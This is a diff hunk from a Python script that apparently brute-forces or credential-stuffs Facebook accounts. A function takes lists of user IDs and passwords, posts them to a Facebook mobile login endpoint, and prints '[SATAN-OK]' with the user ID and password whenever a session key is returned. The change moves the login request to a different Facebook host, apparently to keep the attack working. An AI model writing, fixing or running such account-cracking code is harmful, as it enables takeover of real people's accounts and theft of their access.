@@ -43,7 +43,7 @@ def api1(ids,names,passlist,total_ids):
                                         "method": "auth.login",
                                         "fb_api_req_friendly_name": "authenticate",
                                         "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
-			po = requests.post('https://b-api.facebook.com/auth/login',data=data,headers=head).json()
+			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
 			if 'session_key' in po:
 				uid = str(po['uid'])
 				print('\r\r\033[1;32m [SATAN-OK] '+uid+' | '+pas)
